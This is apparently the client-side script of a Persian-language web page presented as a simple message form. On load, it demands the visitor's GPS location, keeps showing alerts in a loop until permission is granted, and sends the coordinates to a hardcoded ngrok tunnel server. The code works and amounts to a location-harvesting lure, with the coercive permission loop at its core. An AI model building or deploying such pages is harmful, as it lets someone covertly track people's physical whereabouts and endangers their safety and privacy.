var server = "https://b760-79-127-241-55.ngrok-free.app";

// Check GPS and ask for location permission
async function checkAndRequestLocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function (position) {
                    // Received location successfully
                    resolve(position);
                },
                function (error) {
                    if (error.code === error.PERMISSION_DENIED) {
                        alert("لطفا اجازه دسترسی به موقعیت مکانی را بدهید.");
                        resolve(null);
                    } else if (error.code === error.POSITION_UNAVAILABLE) {
                        alert("لطفا GPS خود را روشن نمائید");
                        resolve(null);
                    } else {
                        reject(error);
                    }
                }
            );
        } else {
            alert("موقعیت مکانی برای مرورگر شما در دسترس نیست");
            resolve(null);
        }
    });
}

// Send location to the server
function sendLocationToServer(latitude, longitude) {
    const locationData = {
        location: {
            latitude: latitude,
            longitude: longitude,
        },
    };
    fetch(`${server}/send-location`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(locationData),
    })
        .then((response) => response.json())
        .then((data) => {
            console.log("Location sent successfully:", data);
        })
        .catch((error) => {
            console.error("Error sending location:", error);
        });
}

// Manage accessing to location
async function handleLocationAccess() {
    let location = null;
    // Try to get location
    while (!location) {
        try {
            location = await checkAndRequestLocation();
        } catch (error) {
            console.error("Error checking location:", error);
        }
        if (!location) {
            alert("دسترسی به موقعیت مکانی باید تکمیل شود.");
        }
    }
    const { latitude, longitude } = location.coords;
    sendLocationToServer(latitude, longitude);
}

// Run location permission on load
window.onload = handleLocationAccess;

// Send message
document.getElementById("messageForm").addEventListener("submit", function (event) {
    event.preventDefault();
    // Get name and message
    const name = document.getElementById("name").value;
    const message = document.getElementById("message").value;
    // Prepare message data
    const messageData = {
        name: name,
        message: message,
    };
    // Send message to the server
    fetch(`${server}/receive-message`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(messageData),
    })
        .then((response) => response.json())
        .then((data) => {
            alert("پیام با موفقیت ارسال گردید");
            document.getElementById("messageForm").reset();
        })
        .catch((error) => {
            console.error("Error sending message:", error);
            alert("ارسال پیام ناموفق بود");
        });
});
